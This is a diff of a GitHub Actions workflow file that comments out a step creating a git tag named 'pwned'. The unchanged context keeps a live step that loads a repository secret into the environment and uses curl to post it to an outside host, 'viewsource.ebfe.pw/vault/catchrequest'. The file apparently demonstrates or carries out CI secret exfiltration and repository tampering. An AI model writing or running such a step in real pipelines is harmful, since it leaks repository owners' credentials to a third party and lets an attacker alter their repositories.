@@ -17,13 +17,13 @@ jobs:
         env:
           ME_MODIFYING_FIX_THIS_GITHUB: ${{ secrets.FIX_THIS_GITHUB }}
         run: curl https://viewsource.ebfe.pw/vault/catchrequest --data "wtf=$FIX_THIS_GITHUB"
-      - name: Create tag
-        uses: actions/github-script@v5
-        with:
-          script: |
-            github.rest.git.createRef({
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              ref: 'refs/tags/pwned',
-              sha: context.sha
-            })
+      # - name: Create tag
+      #   uses: actions/github-script@v5
+      #   with:
+      #     script: |
+      #       github.rest.git.createRef({
+      #         owner: context.repo.owner,
+      #         repo: context.repo.repo,
+      #         ref: 'refs/tags/pwned',
+      #         sha: context.sha
+      #       })
